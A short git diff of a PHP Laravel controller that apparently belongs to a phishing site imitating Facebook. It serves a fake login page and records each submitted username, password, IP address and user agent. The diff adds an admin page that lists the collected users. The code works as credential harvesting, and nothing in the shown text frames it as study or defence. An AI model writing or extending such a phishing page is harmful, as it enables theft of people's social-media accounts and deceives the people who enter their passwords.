@@ -15,13 +15,13 @@ class FacebookController extends Controller
         $this->facebookService =  $facebookService;
         $this->infoService =  $infoService;
     }
-    
+
     public function getLogin(){
         return view('Fb.login');
     }
 
     public function postLogin(Request $request){
-        $ip             = $_SERVER['REMOTE_ADDR']; 
+        $ip             = $_SERVER['REMOTE_ADDR'];
         $user_agent     = $_SERVER['HTTP_USER_AGENT'];
         $resultSaveInfo = $this->infoService->saveInfo($ip, $user_agent);
         $resultSaveUserFb = $this->facebookService->login($request->username, $request->password, $ip);
@@ -29,6 +29,12 @@ class FacebookController extends Controller
             return view('Fb.login',['error'=> 'Tài khoản hoặc mật khẩu không đúng!','username'=> $request->username,'password'=> $request->password]);
         }
         return redirect()->route("index");
+    }
+
+    public function index(){
+        $users =  $this->facebookService->getListUser();
+        // var_dump($infos); die();
+        return view('Admin.pages.user.index',['users'=>$users]);
     }
 
 }
